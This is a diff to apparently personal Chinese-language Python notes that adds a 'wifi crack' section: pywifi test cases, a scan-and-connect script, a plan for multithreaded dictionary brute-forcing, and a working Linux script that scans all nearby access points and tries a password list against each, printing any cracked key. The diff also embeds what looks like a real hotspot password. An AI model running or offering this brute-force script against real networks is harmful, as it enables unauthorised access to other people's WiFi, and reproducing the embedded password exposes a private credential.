@@ -18,6 +18,9 @@
         - [python extending with c++](#python-extending-with-c)
         - [python extending with cython](#python-extending-with-cython)
     - [rename mulitiple files](#rename-mulitiple-files)
+    - [wifi example](#wifi-example)
+        - [windows wifi crack](#windows-wifi-crack)
+        - [linux wifi crack](#linux-wifi-crack)
 
 <!-- /TOC -->
 
@@ -858,4 +861,290 @@ import os, re
 for filename in os.listdir('.'):
     if filename.startswith('wlm'):
         os.rename(filename, filename[8:])
+```
+
+## wifi example
+
+### windows wifi crack
+
+`pip install pywifi`, `pip install pytest`
+
+step1: test
+
+```python
+# 采用的pywifi的test case
+"""
+Test cases for pywifi.
+"""
+
+import pytest
+import sys
+import time
+import platform
+import logging
+
+import pywifi
+from pywifi import const
+
+# 输出日志
+pywifi.set_loglevel(logging.INFO)
+
+
+def test_interfaces():
+    wifi = pywifi.PyWiFi()
+
+    assert wifi.interfaces()  # 抓取网卡接口
+
+    if platform.system().lower() == 'windows':
+        assert wifi.interfaces()[0].name() == \
+               'Intel(R) Dual Band Wireless-AC 7260'
+    elif platform.system().lower() == 'linux':
+        assert wifi.interfaces()[0].name() == 'wlx000c433243ce'
+
+
+def test_scan():
+    wifi = pywifi.PyWiFi()  # 初始化wifi
+
+    iface = wifi.interfaces()[0]  # 第一个无线网卡
+    iface.scan()  # 扫描
+    time.sleep(5)
+    bsses = iface.scan_results()  # 扫描结果
+    assert bsses
+
+    # for obj in bsses:
+    #     print(obj)  # 每一个wifi创建一个object
+
+
+def test_add_network_profile():
+    wifi = pywifi.PyWiFi()
+
+    iface = wifi.interfaces()[0]
+
+    profile = pywifi.Profile()
+    profile.ssid = 'testap'
+    profile.auth = const.AUTH_ALG_OPEN
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)
+    profile.cipher = const.CIPHER_TYPE_CCMP
+    profile.key = '12345678'
+
+    iface.remove_all_network_profiles()
+
+    assert len(iface.network_profiles()) == 0
+
+    iface.add_network_profile(profile)
+    profiles = iface.network_profiles()
+
+    assert profiles is not None
+    assert profiles[0].ssid == "testap"
+    assert const.AKM_TYPE_WPA2PSK in profiles[0].akm
+    assert const.AUTH_ALG_OPEN == profiles[0].auth
+
+
+def test_status():
+    wifi = pywifi.PyWiFi()
+
+    iface = wifi.interfaces()[0]
+    assert iface.status() in \
+           [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+
+
+def test_connect():
+    wifi = pywifi.PyWiFi()
+
+    iface = wifi.interfaces()[0]
+
+    iface.disconnect()
+    time.sleep(1)
+    assert iface.status() in \
+           [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+
+    profile = pywifi.Profile()
+    profile.ssid = 'Mi Phone'  # 用的手机热点
+    profile.auth = const.AUTH_ALG_OPEN
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)
+    profile.cipher = const.CIPHER_TYPE_CCMP
+    profile.key = 'grey631331'
+
+    iface.remove_all_network_profiles()
+    tmp_profile = iface.add_network_profile(profile)
+
+    iface.connect(tmp_profile)
+    time.sleep(10)
+    assert iface.status() == const.IFACE_CONNECTED
+
+    iface.disconnect()
+    time.sleep(1)
+    assert iface.status() in \
+           [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+
+
+def test_disconnect():
+    wifi = pywifi.PyWiFi()
+
+    iface = wifi.interfaces()[0]
+    iface.disconnect()
+
+    assert iface.status() in \
+           [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+
+
+if __name__ == '__main__':
+    # # 先测试扫描
+    # test_scan()
+    # 再开热点，测试连接
+    test_connect()
+```
+
+step2: 核心代码
+```python
+import time
+import pywifi
+from pywifi import const
+
+
+def test_scan():
+    wifi = pywifi.PyWiFi()  # 初始化wifi
+
+    iface = wifi.interfaces()[0]  # 第一个无线网卡
+    iface.scan()  # 扫描
+    time.sleep(5)
+    bsses = iface.scan_results()  # 扫描结果
+
+    for obj in bsses:
+        print(obj, obj.ssid)  # 每一个wifi创建一个object
+
+
+def test_connect():
+    wifi = pywifi.PyWiFi()
+
+    iface = wifi.interfaces()[0]
+
+    iface.disconnect()
+    time.sleep(1)
+
+    profile = pywifi.Profile()
+    profile.ssid = 'Mi Phone'  # 用的是手机热点
+    profile.auth = const.AUTH_ALG_OPEN
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)
+    profile.cipher = const.CIPHER_TYPE_CCMP
+    profile.key = 'grey631331'
+
+    iface.remove_all_network_profiles()
+    tmp_profile = iface.add_network_profile(profile)
+
+    iface.connect(tmp_profile)
+    time.sleep(10)
+    is_connected = False
+    if iface.status() == const.IFACE_CONNECTED:
+        is_connected = True
+        print('connect success!')
+
+    iface.disconnect()
+
+    if is_connected:
+        return is_connected
+
+    time.sleep(1)
+    if iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
+        print('connect failed')
+
+    return is_connected
+
+
+if __name__ == '__main__':
+    test_scan()
+    # test_connect()
+```
+
+思路:
+1. `test_scan`获取所有的ssid
+1. 每一个密码文件一个进程，通过Array, List, Value进行进程通信; 有破解的通知其他进程退出
+1. 密码读入list, 对list分段，多线程爆破;　有破解的通知其他线程推出
+
+![](res/wifi01.png)
+
+### linux wifi crack
+
+虚拟机没有物理网卡，需要usb网卡;
+
+windows vs linux wifi:
+- windows每次需要建文件所以比linux慢
+- windows有安全设定，会很慢
+
+```python
+# 这个windows上也能用,建议在linux上使用
+from pywifi import *
+import time
+import sys
+
+
+def scans(face, timeout):
+    # 开始扫描
+    face.scan()
+    time.sleep(timeout)
+    # 在若干秒后获取扫描结果
+    return face.scan_results()
+
+
+def go(i, face, x, key, ts):
+    # 显示对应网络名称，考虑到部分中文名啧显示bssid
+    showID = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid
+    print("wifiname", showID)
+    # 迭代字典并进行爆破
+    for n, k in enumerate(key):
+        x.key = k.strip()
+        # 移除所有热点配置
+        face.remove_all_network_profiles()
+        # 讲封装好的目标尝试连接
+        face.connect(face.add_network_profile(x))
+        # 初始化状态码，考虑到用0会发生些逻辑错误
+        code = 10
+        t1 = time.time()
+        # 循环刷新状态，如果置为0则密码错误，如超时则进行下一个
+        while code != 0:
+            time.sleep(10)
+            code = face.status()
+            now = time.time() - t1
+            if now > ts:
+                break
+            # print ("\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s-------"%(6,i,18,showID,code,5,now,7,x.signal,10,len(key)-n,10,k.replace("\n","")))
+            # print "code=",code
+            if code == 4:
+                print("password----OK", n, k)
+                face.disconnect()
+                return "密码破解%-*s| %s | %*s |%*s\n" % (20, x.ssid, x.bssid, 3, x.signal, 15, k)
+    return False
+
+
+def main():
+    # 扫描时常
+    scantimes = 3
+    # 单个密码测试延迟
+    testtimes = 10
+    keys = ["302....8", "grey631331", "12345678"]
+    print("|KEYS %s" % (len(keys)))
+    # 实例化一个pywifi对象
+    wifi = PyWiFi()
+    # 选择定一个网卡并赋值于iface
+    iface = wifi.interfaces()[0]
+    # 通过iface进行一个时常为scantimes的扫描并获取附近的热点基础配置
+    scanres = scans(iface, scantimes)
+    # 统计附近被发现的热点数量
+    nums = len(scanres)
+    print("|SCAN GET %s" % (nums))
+    print("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s" % (
+        "-" * 70, 6, "WIFIID", 18, "SSID OR BSSID", 2, "N", 4, "time", 7, "signal", 10, "KEYNUM", 10, "KEY", "=" * 70))
+    # 将每一个热点信息逐一进行测试
+    print("start")
+    for i, x in enumerate(scanres):
+        # 测试完毕后，成功的结果讲存储到files中
+        try:
+            res = go(nums - i, iface, x, keys, testtimes)
+            print(res)
+        except:
+            print("触发异常")
+    print("end")
+
+
+main()
 ```
